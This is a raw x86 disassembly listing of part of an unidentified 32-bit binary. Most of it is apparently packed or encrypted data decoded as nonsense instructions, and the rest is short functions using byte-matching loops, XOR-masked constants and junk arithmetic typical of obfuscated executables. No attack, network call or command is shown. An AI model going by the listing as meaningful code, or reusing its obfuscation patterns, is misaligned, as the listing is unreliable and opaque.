  41a7eb:	xlat   BYTE PTR ds:[ebx]
  41a7ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a7ed:	push   0x3
  41a7ef:	ds mov al,0x49
  41a7f2:	jmp    0xe180a337
  41a7f7:	test   DWORD PTR [eax+0x2f9fc8b2],edx
  41a7fd:	mov    bl,0x9e
  41a7ff:	xchg   edx,eax
  41a800:	pop    es
  41a801:	sub    cl,BYTE PTR [edx+esi*2]
  41a804:	jp     0x41a819
  41a806:	mov    esp,0xbe0b0db
  41a80b:	add    dh,al
  41a80d:	les    esp,FWORD PTR [ecx+0x4c]
  41a810:	mov    ebx,0x68678cad
  41a815:	mov    ?,WORD PTR [ebx]
  41a817:	clc    
  41a818:	add    eax,0x90d33e38
  41a81d:	sub    ebp,esp
  41a81f:	popa   
  41a820:	(bad)  
  41a821:	mov    bh,0x34
  41a823:	into   
  41a824:	xchg   ebp,eax
  41a825:	push   ds
  41a826:	fadd   DWORD PTR [ebx]
  41a828:	sbb    BYTE PTR [ebx],dh
  41a82a:	rcr    DWORD PTR [ecx],1
  41a82c:	jmp    0x9a843a32
  41a831:	adc    esi,DWORD PTR [ebx+0x6e]
  41a834:	push   ebp
  41a835:	add    ebx,DWORD PTR [ebp+0x77]
  41a838:	das    
  41a839:	push   ebp
  41a83a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a83b:	adc    al,BYTE PTR [edx]
  41a83d:	clc    
  41a83e:	shl    bl,1
  41a840:	push   ebx
  41a841:	aam    0x11
  41a843:	push   edi
  41a844:	push   0x2f26cd62
  41a849:	jmp    0x41a8a1
  41a84b:	jle    0x41a81a
  41a84d:	dec    si
  41a84f:	bound  ecx,QWORD PTR [edx+0x10]
  41a852:	mov    DWORD PTR [edx-0x3c48d966],esi
  41a858:	inc    esi
  41a859:	bts    DWORD PTR [ecx+eiz*4],esi
  41a85d:	hlt    
  41a85e:	sahf   
  41a85f:	pop    esi
  41a860:	cmp    DWORD PTR [eax-0x31],0x6a
  41a864:	add    eax,0x28e2c2ac
  41a869:	and    BYTE PTR [esi],ah
  41a86b:	test   DWORD PTR [ecx+0x27],ecx
  41a86e:	mov    BYTE PTR [esi-0x2f9e7555],ah
  41a874:	mov    dl,0xc2
  41a876:	fimul  DWORD PTR [ebx+edi*4-0x765796dc]
  41a87d:	xor    DWORD PTR [esi+0x5f03e8f4],ebx
  41a883:	xor    al,0xa0
  41a885:	lds    ebx,FWORD PTR [edx]
  41a887:	mov    bl,al
  41a889:	push   ss
  41a88a:	aad    0xe
  41a88c:	popf   
  41a88d:	mul    BYTE PTR [esi-0x6724564f]
  41a893:	sub    BYTE PTR [ecx-0x41832a2c],dl
  41a899:	dec    esp
  41a89a:	xor    DWORD PTR [esi+0x416b550],ebp
  41a8a0:	pop    ss
  41a8a1:	mov    ds:0x11a93704,al
  41a8a6:	xlat   BYTE PTR ds:[ebx]
  41a8a7:	mov    cl,BYTE PTR [esi+0x7326e0c0]
  41a8ad:	push   esi
  41a8ae:	pop    ecx
  41a8af:	dec    esi
  41a8b0:	mov    ds:0x4819631c,eax
  41a8b5:	imul   edi,DWORD PTR [eax],0xffffffc7
  41a8b8:	adc    eax,0x80b394c
  41a8bd:	mov    ds:0x9334570c,al
  41a8c2:	es xchg ebp,eax
  41a8c4:	lods   al,BYTE PTR ds:[esi]
  41a8c5:	sub    BYTE PTR [edi],ch
  41a8c7:	mov    bh,0xc5
  41a8c9:	dec    ecx
  41a8ca:	jo     0x41a90a
  41a8cc:	push   DWORD PTR [ecx-0x7a333f0]
  41a8d2:	mov    esp,0x98154ece
  41a8d7:	mov    bh,BYTE PTR [eax-0x55]
  41a8da:	xchg   DWORD PTR [edx+0x3e],edi
  41a8dd:	sub    eax,0x7de09697
  41a8e2:	jnp    0x41a8cf
  41a8e4:	inc    edi
  41a8e5:	jg     0x41a93f
  41a8e7:	fistp  DWORD PTR [edi-0x36fd37d1]
  41a8ed:	and    DWORD PTR cs:[edx],edi
  41a8f0:	and    ch,dh
  41a8f2:	in     al,0x84
  41a8f4:	push   ss
  41a8f5:	dec    edx
  41a8f6:	or     al,0x0
  41a8f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a8f9:	xlat   BYTE PTR ds:[ebx]
  41a8fa:	in     al,dx
  41a8fb:	div    WORD PTR [edx+0x3d]
  41a8ff:	sub    DWORD PTR [ebp-0x1],0xffffff88
  41a903:	test   DWORD PTR [ecx+0xe01338e],0x18102042
  41a90d:	cs push ecx
  41a90f:	das    
  41a910:	stos   BYTE PTR es:[edi],al
  41a911:	lds    edx,FWORD PTR [ebx+0x7a]
  41a914:	(bad)  
  41a915:	fiadd  WORD PTR [ecx-0x4404f529]
  41a91b:	cdq    
  41a91c:	rol    BYTE PTR [eax-0x17b6f079],1
  41a922:	out    dx,al
  41a923:	xchg   esp,esi
  41a925:	jp     0x41a934
  41a927:	neg    DWORD PTR [ebx]
  41a929:	les    eax,FWORD PTR [eax+0x70]
  41a92c:	push   ebp
  41a92d:	(bad)  
  41a92e:	pushf  
  41a92f:	xchg   esi,eax
  41a930:	mov    ecx,0x8fac9818
  41a935:	out    dx,eax
  41a936:	aas    
  41a937:	dec    esp
  41a938:	icebp  
  41a939:	sub    al,0x8e
  41a93b:	cld    
  41a93c:	dec    edi
  41a93d:	jnp    0x41a90a
  41a93f:	int3   
  41a940:	icebp  
  41a941:	xor    ch,BYTE PTR [ebx]
  41a943:	jge    0x41a8c8
  41a945:	sar    DWORD PTR ds:0xd3ba00b4,0x20
  41a94c:	add    bh,dh
  41a94e:	inc    ecx
  41a94f:	in     al,dx
  41a950:	fnstenv [ebp-0x27]
  41a953:	imul   BYTE PTR [ecx-0x15]
  41a956:	enter  0x6a82,0xd7
  41a95a:	or     bh,dh
  41a95c:	cmp    DWORD PTR [edx+0x62a0a25f],0x3a
  41a963:	pop    esp
  41a964:	mov    ?,WORD PTR [edi-0x25da4746]
  41a96a:	test   DWORD PTR [edx+0x1ee9f955],ebp
  41a970:	mov    DWORD PTR [edi],edx
  41a972:	pop    ecx
  41a973:	jmp    0x23b66c14
  41a978:	pop    ebx
  41a979:	pushf  
  41a97a:	adc    BYTE PTR [esi],bh
  41a97c:	dec    esp
  41a97d:	imul   eax,ecx,0x3fadf3ba
  41a983:	cmp    eax,0xa9db38f6
  41a988:	ds cld 
  41a98a:	xchg   DWORD PTR [eax-0x14b85afe],esp
  41a990:	ret    0x7871
  41a993:	call   0x32d27029
  41a998:	popa   
  41a999:	stc    
  41a99a:	in     eax,dx
  41a99b:	enter  0x284f,0xd9
  41a99f:	sub    eax,0xe8f157bc
  41a9a4:	adc    eax,0x3bcc1346
  41a9a9:	imul   esi,DWORD PTR [edx+0x44bf6521],0xffffffdf
  41a9b0:	in     eax,dx
  41a9b1:	loopne 0x41a9fd
  41a9b3:	push   es
  41a9b4:	jno    0x41a9a7
  41a9b6:	jge    0x41a9b4
  41a9b8:	int    0x5e
  41a9ba:	dec    ecx
  41a9bb:	cmp    bl,BYTE PTR [ecx-0x4a]
  41a9be:	adc    eax,0x51cbef70
  41a9c3:	in     al,dx
  41a9c4:	inc    ebp
  41a9c5:	cmp    ebp,esp
  41a9c7:	and    eax,0xf3e3240b
  41a9cc:	push   esp
  41a9cd:	clc    
  41a9ce:	mov    eax,0x23ff56b6
  41a9d3:	mov    dh,0x5b
  41a9d5:	(bad)  
  41a9d6:	loop   0x41a9a2
  41a9d8:	imul   BYTE PTR [edi+0xd7b3489]
  41a9de:	mov    ebx,0x3d8392c4
  41a9e3:	je     0x41aa0d
  41a9e5:	push   esp
  41a9e6:	sbb    ah,BYTE PTR [ebp-0x7a]
  41a9e9:	push   0x17
  41a9eb:	or     BYTE PTR [edi],0x1f
  41a9ee:	hlt    
  41a9ef:	int    0xed
  41a9f1:	dec    eax
  41a9f2:	popf   
  41a9f3:	xor    DWORD PTR [eax-0x61],ecx
  41a9f6:	arpl   WORD PTR [edi-0x2f],si
  41a9f9:	ja     0x41aa79
  41a9fb:	pop    es
  41a9fc:	int    0x1
  41a9fe:	jmp    0x29bb:0x6492f063
  41aa05:	fsub   QWORD PTR [ebp+0x2c]
  41aa08:	sbb    ecx,ebp
  41aa0a:	jg     0x41aa47
  41aa0c:	outs   dx,DWORD PTR ds:[esi]
  41aa0d:	lods   al,BYTE PTR ds:[esi]
  41aa0e:	call   0x9bfe:0x76c9f085
  41aa15:	sub    al,0x83
  41aa17:	and    DWORD PTR [ebx],ebx
  41aa19:	push   0xf1f37a3b
  41aa1e:	cdq    
  41aa1f:	push   es
  41aa20:	jo     0x41aa78
  41aa22:	mov    eax,ds:0xed73fb5c
  41aa27:	ret    
  41aa28:	cld    
  41aa29:	push   esp
  41aa2a:	jecxz  0x41aa6c
  41aa2c:	jmp    0x9feee21a
  41aa31:	outs   dx,DWORD PTR ds:[esi]
  41aa32:	xor    dl,ch
  41aa34:	out    0xbf,al
  41aa36:	push   ecx
  41aa37:	cmp    eax,0x561a9412
  41aa3c:	out    0xb9,al
  41aa3e:	in     eax,dx
  41aa3f:	stos   BYTE PTR es:[edi],al
  41aa40:	invd   
  41aa42:	xor    BYTE PTR [eax+0x5f428183],bl
  41aa48:	pushf  
  41aa49:	mov    edx,0x3924ec85
  41aa4e:	xchg   edi,eax
  41aa4f:	adc    dh,BYTE PTR [esi-0x2745f453]
  41aa55:	test   al,0xb7
  41aa57:	ja     0x41aa05
  41aa59:	adc    eax,0xa43263e0
  41aa5e:	pop    ecx
  41aa5f:	inc    bp
  41aa61:	adc    DWORD PTR [edx+esi*2-0x7d],ebx
  41aa65:	add    DWORD PTR [edx],ecx
  41aa67:	aas    
  41aa68:	fs popf 
  41aa6a:	in     eax,dx
  41aa6b:	inc    ebp
  41aa6c:	bound  ecx,QWORD PTR [edx]
  41aa6e:	not    eax
  41aa70:	push   edx
  41aa71:	pusha  
  41aa72:	pop    edi
  41aa73:	mov    ch,0xe4
  41aa75:	sub    edi,DWORD PTR [edx-0x62]
  41aa78:	test   al,0xb6
  41aa7a:	out    dx,eax
  41aa7b:	dec    esp
  41aa7c:	pop    edi
  41aa7d:	sub    ebp,edx
  41aa7f:	(bad)  
  41aa80:	xor    DWORD PTR [eax+0x28],edi
  41aa83:	mov    al,0x66
  41aa85:	ret    
  41aa86:	xchg   edx,eax
  41aa87:	or     bh,BYTE PTR [edx+eiz*1]
  41aa8a:	jb     0x41aa29
  41aa8c:	adc    al,0x3e
  41aa8e:	jbe    0x41aaab
  41aa90:	jmp    0x41aa16
  41aa92:	aad    0x21
  41aa94:	les    ebp,FWORD PTR [esi]
  41aa96:	push   cs
  41aa97:	or     al,0x6d
  41aa99:	mov    BYTE PTR [esi],ch
  41aa9b:	aaa    
  41aa9c:	fbld   TBYTE PTR [ebx+edx*4-0x77]
  41aaa0:	mov    cl,0x52
  41aaa2:	mov    dh,0x84
  41aaa4:	inc    ebx
  41aaa5:	sahf   
  41aaa6:	popf   
  41aaa7:	jmp    0xdb9529b5
  41aaac:	inc    ebx
  41aaad:	jne    0x41aaa0
  41aaaf:	xor    al,0x4a
  41aab1:	mov    ebx,0xfe593d8c
  41aab6:	fwait
  41aab7:	add    DWORD PTR [ecx-0x4d],esp
  41aaba:	lds    ebx,FWORD PTR [ebx+0x6d]
  41aabd:	test   BYTE PTR [eax+0x3911d3fd],bh
  41aac3:	xor    BYTE PTR [ebp+eiz*4+0x6ae6b3a7],cl
  41aaca:	mov    cl,0xb5
  41aacc:	ror    DWORD PTR [ecx],cl
  41aace:	inc    edi
  41aacf:	jnp    0x41aa90
  41aad1:	(bad)  
  41aad2:	jmp    0x5318:0x63715faa
  41aad9:	add    DWORD PTR [ecx],ebx
  41aadb:	xor    cl,al
  41aadd:	or     eax,0xa7fc9025
  41aae2:	inc    ebp
  41aae3:	in     eax,0x3e
  41aae5:	xchg   ebx,eax
  41aae6:	jns    0x41ab0d
  41aae8:	repz jp 0x41ab2d
  41aaeb:	pop    esp
  41aaec:	mov    cl,0x2a
  41aaee:	xchg   ecx,eax
  41aaef:	xchg   edx,eax
  41aaf0:	jecxz  0x41aaf3
  41aaf2:	cmp    al,0xa5
  41aaf4:	mov    ah,0xb
  41aaf6:	pop    ss
  41aaf7:	mov    BYTE PTR [esi+0x3d],ch
  41aafa:	repnz fdiv DWORD PTR [esp+edx*8+0x2c97ffc6]
  41ab02:	inc    esp
  41ab03:	sub    eax,0x638d35d6
  41ab08:	data16 or ch,dh
  41ab0b:	jl     0x41ab57
  41ab0d:	pushf  
  41ab0e:	in     al,dx
  41ab0f:	popf   
  41ab10:	(bad)  
  41ab12:	div    BYTE PTR [eax+0x5f]
  41ab15:	add    dh,BYTE PTR [edx]
  41ab17:	push   0xffffffc3
  41ab19:	cld    
  41ab1a:	dec    ebp
  41ab1b:	dec    ebp
  41ab1c:	jge    0x41aac9
  41ab1e:	xchg   edx,eax
  41ab1f:	xchg   esp,eax
  41ab20:	daa    
  41ab21:	shl    esi,1
  41ab23:	mov    cl,0x9c
  41ab25:	repnz arpl WORD PTR [eax+0x6],di
  41ab29:	loopne 0x41ab10
  41ab2b:	ret    0xaa3f
  41ab2e:	cmp    eax,0x54b89ba3
  41ab33:	mov    dh,0xbb
  41ab35:	popa   
  41ab36:	sbb    al,BYTE PTR [ecx-0x54a9cbf4]
  41ab3c:	stos   DWORD PTR es:[edi],eax
  41ab3d:	jno    0x41abac
  41ab3f:	inc    esp
  41ab40:	push   esi
  41ab41:	fsubr  DWORD PTR [ebp+0xc402ee4]
  41ab47:	out    0x86,al
  41ab49:	and    DWORD PTR [edx],eax
  41ab4b:	jle    0x41aaef
  41ab4d:	sbb    eax,0x69841222
  41ab52:	push   0xc854c075
  41ab57:	mov    eax,ds:0xa949020a
  41ab5c:	inc    edi
  41ab5d:	in     al,dx
  41ab5e:	fs scas al,BYTE PTR es:[edi]
  41ab60:	pop    edx
  41ab61:	mov    es,WORD PTR [ecx-0x28]
  41ab64:	fs clc 
  41ab66:	neg    ch
  41ab68:	dec    esp
  41ab69:	mov    dl,0x84
  41ab6b:	lock sar bl,cl
  41ab6e:	push   edi
  41ab6f:	sub    DWORD PTR [ebp+0x62e6fd9c],eax
  41ab75:	dec    edi
  41ab76:	and    ebx,esp
  41ab78:	retf   
  41ab79:	mov    DWORD PTR [esi],edx
  41ab7b:	outs   dx,DWORD PTR ds:[esi]
  41ab7c:	rcr    DWORD PTR [edx-0x31cb1168],0x32
  41ab83:	lods   al,BYTE PTR ds:[esi]
  41ab84:	adc    BYTE PTR [ebx+0x4b8ea4d8],al
  41ab8a:	mov    DWORD PTR [edi],eax
  41ab8c:	in     eax,dx
  41ab8d:	jl     0x41ab97
  41ab8f:	dec    ebx
  41ab90:	(bad)  
  41ab92:	or     al,0xc8
  41ab94:	xchg   DWORD PTR [edi+0xaa79240],ebp
  41ab9a:	cld    
  41ab9b:	sbb    ecx,DWORD PTR [eax+0x6e9cf309]
  41aba1:	lock fisubr DWORD PTR [eax+eiz*1-0x4dfa254c]
  41aba9:	sbb    al,0xb3
  41abab:	paddb  mm3,mm4
  41abae:	xchg   DWORD PTR [eax-0x5b],eax
  41abb1:	xchg   esp,eax
  41abb2:	xchg   edi,eax
  41abb3:	popa   
  41abb4:	mov    al,0x1a
  41abb6:	call   0x895d:0xd568c4e
  41abbd:	add    al,0x2
  41abbf:	call   0x2c04:0x33bf0f7b
  41abc6:	push   ss
  41abc7:	mov    ch,0x34
  41abc9:	in     eax,dx
  41abca:	inc    ebp
  41abcb:	lods   al,BYTE PTR ds:[esi]
  41abcc:	aas    
  41abcd:	fcmovnu st,st(3)
  41abcf:	push   cs
  41abd0:	adc    bl,dl
  41abd2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41abd3:	mov    ss,WORD PTR [ebx+0x6710d0cb]
  41abd9:	sub    DWORD PTR [ecx+0x2b],eax
  41abdc:	aaa    
  41abdd:	daa    
  41abde:	mov    esp,0x203f3da3
  41abe3:	mov    bl,0xea
  41abe5:	retf   
  41abe6:	sbb    al,0xb
  41abe8:	or     ecx,eax
  41abea:	and    bh,ch
  41abec:	fadd   QWORD PTR ds:0xaf326e03
  41abf2:	das    
  41abf3:	jbe    0x41abdc
  41abf5:	sar    DWORD PTR [ebx],cl
  41abf7:	push   ds
  41abf8:	rcr    BYTE PTR [edx+0x2e],1
  41abfb:	adc    al,0xe0
  41abfd:	loop   0x41abe0
  41abff:	fisttp QWORD PTR [eax]
  41ac01:	(bad)  
  41ac02:	aam    0x9c
  41ac04:	adc    bl,BYTE PTR [eax+0x45]
  41ac07:	daa    
  41ac08:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ac09:	and    BYTE PTR [eax],ah
  41ac0b:	push   eax
  41ac0c:	pop    eax
  41ac0d:	in     al,dx
  41ac0e:	or     edi,edx
  41ac10:	and    esp,DWORD PTR ds:0x9387ee45
  41ac16:	mov    edi,0x716ed925
  41ac1b:	jle    0x41ac20
  41ac1d:	(bad)
  41ac21:	and    BYTE PTR [edi+0x41],bl
  41ac24:	test   DWORD PTR [ebp-0x14],0x17472b01
  41ac2b:	mov    al,BYTE PTR [edx+0x7d]
  41ac2e:	cmp    eax,0x91e6b598
  41ac33:	sub    eax,edx
  41ac35:	mov    dl,0x57
  41ac37:	jmp    0x9098:0x9d97ef68
  41ac3e:	cmp    ecx,DWORD PTR [eax+0x6f6fce2c]
  41ac44:	jb     0x41ac93
  41ac46:	das    
  41ac47:	(bad)  
  41ac48:	in     eax,dx
  41ac49:	mov    ds:0xcbe1774c,eax
  41ac4e:	inc    edx
  41ac4f:	stos   DWORD PTR es:[edi],eax
  41ac50:	(bad)  
  41ac51:	in     eax,dx
  41ac52:	jnp    0x41ac87
  41ac54:	add    BYTE PTR [eax+0x9],bh
  41ac57:	mov    edx,0xfbde984f
  41ac5c:	mov    dh,BYTE PTR [ebx+0x1d]
  41ac5f:	in     eax,0x96
  41ac61:	loope  0x41acb3
  41ac63:	sti    
  41ac64:	fwait
  41ac65:	or     bl,BYTE PTR ds:0x43991196
  41ac6b:	inc    esp
  41ac6c:	and    bh,cl
  41ac6e:	sti    
  41ac6f:	jecxz  0x41ac58
  41ac71:	inc    eax
  41ac72:	mov    ebx,0x37d200e
  41ac77:	repnz xchg esp,eax
  41ac79:	sub    esi,ecx
  41ac7b:	pop    ecx
  41ac7c:	push   ds
  41ac7d:	loope  0x41ac9f
  41ac7f:	and    esp,esp
  41ac81:	mov    al,0x95
  41ac83:	cmp    DWORD PTR [eax+ebp*1],ebp
  41ac86:	call   0x8082559a
  41ac8b:	cmp    BYTE PTR ds:0x26c453ca,bh
  41ac91:	fiadd  DWORD PTR [ebx]
  41ac93:	popf   
  41ac94:	(bad)  
  41ac96:	push   eax
  41ac97:	jle    0x41acff
  41ac99:	sub    DWORD PTR [ebx+0x1b26578c],esi
  41ac9f:	rcl    ah,0x0
  41aca2:	outs   dx,BYTE PTR ds:[esi]
  41aca3:	pop    esp
  41aca4:	add    DWORD PTR [esp+edx*8],0x25
  41aca8:	jae    0x41ad27
  41acaa:	retf   
  41acab:	cli    
  41acac:	inc    eax
  41acad:	loopne 0x41aced
  41acaf:	inc    edi
  41acb0:	popa   
  41acb1:	or     cl,BYTE PTR [ecx]
  41acb3:	mov    ebp,0xeefdd17a
  41acb8:	sbb    eax,0xc2355369
  41acbd:	push   eax
  41acbe:	in     eax,dx
  41acbf:	adc    ch,bl
  41acc1:	loop   0x41ad13
  41acc3:	(bad)
  41acc8:	lods   al,BYTE PTR ds:[esi]
  41acc9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41acca:	stc    
  41accb:	test   BYTE PTR [esi],0x6c
  41acce:	repnz mov es,WORD PTR [edx-0x15]
  41acd2:	cs xchg edx,eax
  41acd4:	xchg   edi,eax
  41acd5:	shr    edi,cl
  41acd7:	mov    ebx,0xbcc2d4ac
  41acdc:	xor    BYTE PTR [eax+0x3b],ah
  41acdf:	mov    al,BYTE PTR [ebx+0x11]
  41ace2:	test   al,ch
  41ace4:	(bad)  
  41ace5:	cmp    eax,0xe7c34b31
  41acea:	js     0x41ad49
  41acec:	pushf  
  41aced:	sbb    dh,BYTE PTR [eax]
  41acef:	or     DWORD PTR [ebx],edx
  41acf1:	stos   BYTE PTR es:[edi],al
  41acf2:	arpl   WORD PTR [edx],di
  41acf4:	out    dx,eax
  41acf5:	cld    
  41acf6:	mov    ds:0x25130102,eax
  41acfb:	push   ds
  41acfc:	scas   eax,DWORD PTR es:[edi]
  41acfd:	mov    eax,0x4cce818e
  41ad02:	das    
  41ad03:	or     al,BYTE PTR [esi-0x73]
  41ad06:	dec    edx
  41ad07:	stos   BYTE PTR es:[edi],al
  41ad08:	test   esi,ebp
  41ad0a:	push   edi
  41ad0b:	stos   BYTE PTR es:[edi],al
  41ad0c:	jmp    0x81db:0x2cb0fc3a
  41ad13:	ja     0x41aca2
  41ad15:	inc    edx
  41ad16:	mov    dh,0xd0
  41ad19:	aam    0xfe
  41ad1b:	jl     0x41ad91
  41ad1d:	mov    ch,BYTE PTR [ebx+0x456b3888]
  41ad23:	sub    esp,DWORD PTR [edi-0x195e93ed]
  41ad29:	push   es
  41ad2a:	xchg   ebp,eax
  41ad2b:	cld    
  41ad2c:	sbb    ecx,DWORD PTR [esi]
  41ad2e:	xor    edi,eax
  41ad30:	cmp    edi,edi
  41ad32:	sub    BYTE PTR [ebp-0x57],0x4b
  41ad36:	and    edi,DWORD PTR [eax-0x5a]
  41ad39:	(bad)  
  41ad3a:	loop   0x41ad79
  41ad3c:	cmp    bl,0x9
  41ad3f:	mov    BYTE PTR [edx],bl
  41ad41:	dec    ecx
  41ad42:	push   0x7b07877c
  41ad47:	fimul  DWORD PTR [edi-0x5d]
  41ad4a:	lods   eax,DWORD PTR ds:[esi]
  41ad4b:	or     dh,BYTE PTR [ebx]
  41ad4d:	xchg   BYTE PTR [edx],dh
  41ad4f:	sti    
  41ad50:	not    BYTE PTR [esi]
  41ad52:	add    BYTE PTR [edi],cl
  41ad54:	inc    eax
  41ad55:	push   esp
  41ad56:	cmc    
  41ad57:	inc    ecx
  41ad58:	aad    0xd0
  41ad5a:	scas   eax,DWORD PTR es:[edi]
  41ad5b:	sub    cl,BYTE PTR [ebx-0x21]
  41ad5e:	pop    ss
  41ad5f:	inc    esi
  41ad60:	push   ebx
  41ad61:	(bad)  
  41ad62:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ad63:	push   0x2fdb3ae3
  41ad68:	cdq    
  41ad69:	mov    bh,0x8f
  41ad6b:	outs   dx,BYTE PTR ds:[esi]
  41ad6c:	pop    ebp
  41ad6d:	sub    bh,bl
  41ad6f:	push   es
  41ad70:	jmp    0x41acf8
  41ad72:	rcr    dl,1
  41ad74:	sub    edi,eax
  41ad76:	sbb    al,0x21
  41ad78:	fdiv   QWORD PTR [esi+0x7b]
  41ad7b:	jl     0x41ad2a
  41ad7d:	push   eax
  41ad7e:	jno    0x41adc7
  41ad80:	xchg   ebx,eax
  41ad81:	adc    DWORD PTR [edi],0xffffffd3
  41ad84:	imul   esp,DWORD PTR [ebx+0x10],0x72
  41ad88:	push   es
  41ad89:	pushf  
  41ad8a:	call   0x73a6:0xe425bc07
  41ad91:	sub    al,0x68
  41ad93:	add    al,0x74
  41ad95:	mov    BYTE PTR [edx],bh
  41ad97:	cdq    
  41ad98:	mov    bl,0x9d
  41ad9a:	or     eax,0xa2f1b9ab
  41ad9f:	cli    
  41ada0:	sub    DWORD PTR [esi],edx
  41ada2:	daa    
  41ada3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ada4:	push   0x39542b3a
  41ada9:	dec    ecx
  41adaa:	mov    ecx,eax
  41adac:	inc    esi
  41adad:	into   
  41adae:	das    
  41adaf:	in     al,0x2f
  41adb1:	push   0x528dd73f
  41adb6:	cs pop ss
  41adb8:	repz push 0x24
  41adbb:	jecxz  0x41ad95
  41adbd:	stos   DWORD PTR es:[edi],eax
  41adbe:	mov    ebx,0x5333938e
  41adc3:	xor    DWORD PTR [edx+0x5a],eax
  41adc6:	std    
  41adc7:	xlat   BYTE PTR ds:[ebx]
  41adc8:	push   ds
  41adc9:	inc    esi
  41adca:	sub    cl,dl
  41adcc:	clc    
  41adcd:	jg     0x41ae06
  41adcf:	in     eax,0x47
  41add1:	pop    edi
  41add2:	mov    DWORD PTR [ebp-0x7e85d7ac],ebp
  41add8:	add    BYTE PTR cs:[ecx],al
  41addb:	and    ecx,DWORD PTR [eax+0x7d99094c]
  41ade1:	fist   DWORD PTR [eax]
  41ade3:	xor    dh,BYTE PTR [edi]
  41ade5:	xor    al,0xa1
  41ade7:	cld    
  41ade8:	mov    edi,DWORD PTR [ebx-0x57]
  41adeb:	in     eax,0x89
  41aded:	inc    ebp
  41adee:	clc    
  41adef:	push   DWORD PTR [ebp+0x18]
  41adf2:	jmp    0x41ae4b
  41adf7:	mov    ecx,DWORD PTR [ebp-0x8]
  41adfa:	add    ecx,eax
  41adfc:	mov    DWORD PTR [ebp-0x14],ecx
  41adff:	mov    ecx,DWORD PTR [ebp-0x14]
  41ae02:	mov    ecx,DWORD PTR [ecx+0xc]
  41ae05:	movsx  cx,BYTE PTR [ecx+eax*1]
  41ae0a:	mov    edx,0x3b4b
  41ae0f:	sub    cx,dx
  41ae12:	mov    edx,0x8a85
  41ae17:	xor    cx,dx
  41ae1a:	mov    edx,0x4f85
  41ae1f:	cmp    cx,dx
  41ae22:	jne    0x41adef
  41ae28:	mov    ecx,DWORD PTR ds:0x421c66
  41ae2e:	mov    ecx,DWORD PTR [ecx+0x198]
  41ae34:	mov    DWORD PTR [ecx],eax
  41ae36:	jmp    0x41ae5c
  41ae3b:	mov    ecx,DWORD PTR [ebp+0x18]
  41ae3e:	cmp    ecx,0xf89c85b5
  41ae44:	jne    0x41ae5c
  41ae4a:	push   eax
  41ae4b:	push   DWORD PTR [ebp+0x14]
  41ae4e:	push   DWORD PTR [ebp+0x10]
  41ae51:	push   DWORD PTR [ebp+0xc]
  41ae54:	push   DWORD PTR [ebp+0x8]
  41ae57:	call   0x413d37
  41ae5c:	pop    edi
  41ae5d:	pop    esi
  41ae5e:	leave  
  41ae5f:	ret    0x14
  41ae62:	push   ebp
  41ae63:	mov    ebp,esp
  41ae65:	push   ecx
  41ae66:	mov    DWORD PTR [ebp-0x4],0xf89c85ba
  41ae6d:	mov    eax,DWORD PTR [ebp-0x4]
  41ae70:	mov    ecx,DWORD PTR ds:0x42b010
  41ae76:	sbb    DWORD PTR ds:0x42a018,ecx
  41ae7c:	mov    edx,DWORD PTR [ebp+0x10]
  41ae7f:	mov    DWORD PTR ds:0x42801c,0x4950
  41ae89:	mov    ecx,0x7510893
  41ae8e:	sbb    DWORD PTR ds:0x428028,0x4a48
  41ae98:	xor    eax,ecx
  41ae9a:	add    DWORD PTR ds:0x42b000,0x42800c
  41aea4:	add    eax,0x3272db
  41aea9:	mov    DWORD PTR ds:0x42a014,0x169
  41aeb3:	mov    DWORD PTR [edx],eax
  41aeb5:	sbb    eax,edx
  41aeb7:	mov    eax,DWORD PTR [ebp+0xc]
  41aeba:	xor    eax,ecx
  41aebc:	inc    edx
  41aebd:	push   esi
  41aebe:	xor    esi,edx
  41aec0:	mov    esi,DWORD PTR [ebp+0x10]
  41aec3:	mov    edx,0x3272db
  41aec8:	add    eax,edx
  41aeca:	add    DWORD PTR ds:0x42b01c,0x428020
  41aed4:	mov    DWORD PTR [esi+0x4],eax
  41aed7:	mov    eax,DWORD PTR [ebp+0x14]
  41aeda:	mov    esi,DWORD PTR ds:0x428024
  41aee0:	sbb    esi,DWORD PTR ds:0x429010
  41aee6:	mov    DWORD PTR ds:0x428024,esi
  41aeec:	mov    esi,DWORD PTR [ebp+0x10]
  41aeef:	mov    DWORD PTR [esi+0x8],eax
  41aef2:	mov    eax,DWORD PTR [ebp+0x18]
  41aef5:	mov    esi,DWORD PTR [ebp+0x10]
  41aef8:	mov    DWORD PTR [esi+0xc],eax
  41aefb:	mov    eax,DWORD PTR [ebp+0x1c]
  41aefe:	mov    esi,DWORD PTR [ebp+0x10]
  41af01:	mov    DWORD PTR [esi+0x10],eax
  41af04:	mov    eax,DWORD PTR [ebp+0x8]
  41af07:	xor    eax,ecx
  41af09:	add    eax,edx
  41af0b:	pop    esi
  41af0c:	leave  
  41af0d:	ret    0x18
  41af10:	push   ebp
  41af11:	mov    ebp,esp
  41af13:	sub    esp,0x94
  41af19:	mov    eax,DWORD PTR [ebp+0x8]
  41af1c:	push   ebx
  41af1d:	neg    ecx
  41af1f:	push   esi
  41af20:	adc    esi,0x29b8
  41af26:	push   edi
  41af27:	or     edi,DWORD PTR ds:0x42b010
  41af2d:	mov    esi,0x7510893
  41af32:	or     ecx,ecx
  41af34:	xor    eax,esi
  41af36:	mov    edi,0x3272db
  41af3b:	add    eax,edi
  41af3d:	sub    DWORD PTR ds:0x42a018,0x772b
  41af47:	mov    DWORD PTR [ebp-0x38],eax
  41af4a:	mov    eax,ds:0x421ae6
  41af4f:	mov    ecx,DWORD PTR ds:0x428008
  41af55:	and    DWORD PTR ds:0x42b004,ecx
  41af5b:	mov    eax,DWORD PTR [eax]
  41af5d:	mov    DWORD PTR ds:0x42a01c,0x19
  41af67:	cmp    DWORD PTR ds:0x42a01c,0x0
  41af6e:	je     0x41afbe
  41af74:	cmp    DWORD PTR ds:0x42a01c,0x4
  41af7b:	jne    0x41af92
  41af81:	push   0x506a
  41af86:	push   DWORD PTR [ebp-0x24]
  41af89:	push   DWORD PTR [ebp-0x14]
  41af8c:	call   DWORD PTR ds:0x424028
  41af92:	cmp    DWORD PTR ds:0x42a01c,0x5
  41af99:	jne    0x41afac
